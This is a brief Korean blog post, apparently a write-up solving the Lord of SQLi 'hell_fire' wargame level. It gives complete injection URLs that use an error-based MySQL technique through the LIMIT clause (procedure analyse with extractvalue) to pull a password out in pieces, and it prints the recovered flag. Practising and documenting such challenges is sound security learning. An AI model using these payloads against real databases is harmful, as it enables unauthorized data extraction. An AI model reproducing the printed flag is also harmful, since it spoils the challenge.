---
layout: post
title: LOS Hell_Fire 
date: 2015-08-16 23:12:00 +0900
category: Hacking 
---
```
http://leaveret.kr/los/hell_fire_309d5f471fbdd4722d221835380bb805.php?limit=1%20procedure%20analyse(extractvalue(1,concat(0,(select%20pw%20from%20probhellfire%20limit%201))),1)%23

```

limit 뒤에는 사용할 수 있는 함수가 제한적이다 

procedure analyse()가 사용가능함으로 ```extractvalue```라는 함수를 이용해서 풀음

왠 러시아 형님 블로그가서 찾음 ㅋㅋㅋㅋㅋ



문자열의 길이가 엄청 길기 때문에 여러번 해야 한다.

```
http://los.sandbox.cash/chall/hell_fire_caa31470fa3ada0e8f6bf78cd5730eee.php?limit=2%20procedure%20analyse(extractvalue(0,concat(0x0a,(select%20substr(pw,79)%20from%20probhellfire%20limit%201))),1)%23
```



저기 중간 값을 바꿔가면서 풀면 된다.



```
wwwwwwwwwwoooooowwwwwwwwwwwGodYouNiceHackerrrrrrrrkkkkkkkkkkkkYouDidThisShitLOLLLLLLLLLLLLLLLLLLLLLLL
```









